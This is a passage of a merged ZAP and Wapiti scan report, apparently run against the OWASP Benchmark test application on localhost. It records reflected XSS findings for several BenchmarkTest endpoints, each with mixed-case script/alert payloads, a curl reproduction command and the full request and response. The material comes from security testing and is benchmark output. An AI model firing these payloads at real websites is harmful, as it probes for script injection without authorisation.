                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00805?username=alice&password=Letm3in_&BenchmarkTest00805=%3CScRiPt%3Ealert%28%27w7rba7ppsb%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00805.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00805"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00805?BenchmarkTest00805=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00805.html?BenchmarkTest00805=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00805?username=alice&password=Letm3in_&BenchmarkTest00805=%3CScRiPt%3Ealert%28%27w7rba7ppsb%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w7rba7ppsb')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00806?BenchmarkTest00806=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00806?username=alice&password=Letm3in_&BenchmarkTest00806=%3CScRiPt%3Ealert%28%27wi0mhjjkfa%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wi0mhjjkfa')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wi0mhjjkfa')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00806?username=alice&password=Letm3in_&BenchmarkTest00806=%3CScRiPt%3Ealert%28%27wi0mhjjkfa%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00806.html?BenchmarkTest00806=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00806"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00806?BenchmarkTest00806=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00806.html?BenchmarkTest00806=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00806?username=alice&password=Letm3in_&BenchmarkTest00806=%3CScRiPt%3Ealert%28%27wi0mhjjkfa%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wi0mhjjkfa')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00807?BenchmarkTest00807=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00807?username=alice&password=Letm3in_&BenchmarkTest00807=%3CScRiPt%3Ealert%28%27wp9m31wnf1%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wp9m31wnf1')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wp9m31wnf1')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00807?username=alice&password=Letm3in_&BenchmarkTest00807=%3CScRiPt%3Ealert%28%27wp9m31wnf1%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00807.html?BenchmarkTest00807=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00807"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00807?BenchmarkTest00807=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00807.html?BenchmarkTest00807=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00807?username=alice&password=Letm3in_&BenchmarkTest00807=%3CScRiPt%3Ealert%28%27wp9m31wnf1%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wp9m31wnf1')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00809?BenchmarkTest00809=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00809?username=alice&password=Letm3in_&BenchmarkTest00809=%3CScRiPt%3Ealert%28%27wiu07ka275%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wiu07ka275')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wiu07ka275')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00809?username=alice&password=Letm3in_&BenchmarkTest00809=%3CScRiPt%3Ealert%28%27wiu07ka275%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00809.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00809"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00809?BenchmarkTest00809=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00809.html?BenchmarkTest00809=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00809?username=alice&password=Letm3in_&BenchmarkTest00809=%3CScRiPt%3Ealert%28%27wiu07ka275%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wiu07ka275')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00810?BenchmarkTest00810=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00810?username=alice&password=Letm3in_&BenchmarkTest00810=%3CScRiPt%3Ealert%28%27wzwgfcfysh%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wzwgfcfysh')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wzwgfcfysh')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00810?username=alice&password=Letm3in_&BenchmarkTest00810=%3CScRiPt%3Ealert%28%27wzwgfcfysh%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00810.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00810"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00810?BenchmarkTest00810=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00810.html?BenchmarkTest00810=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00810?username=alice&password=Letm3in_&BenchmarkTest00810=%3CScRiPt%3Ealert%28%27wzwgfcfysh%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:21:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wzwgfcfysh')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
